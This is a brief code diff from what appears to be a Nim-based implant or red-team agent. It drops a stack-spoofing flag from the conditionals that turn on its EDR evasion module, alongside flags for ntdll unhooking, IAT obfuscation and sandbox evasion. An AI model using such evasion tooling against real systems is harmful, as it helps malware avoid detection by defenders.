@@ -20,7 +20,7 @@ else:
     import winim/lean
 
     # Evasion imports
-    when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_stack_spoof):
+    when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
       import utils/evasion
     when defined(sandbox_evasion):
       import utils/sandbox
@@ -69,7 +69,7 @@ else:
 
     # Run evasion techniques as early as possible
     when defined(windows):
-      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_stack_spoof):
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
         runEvasionInit()
 
     # Daemonize if compile flag is set
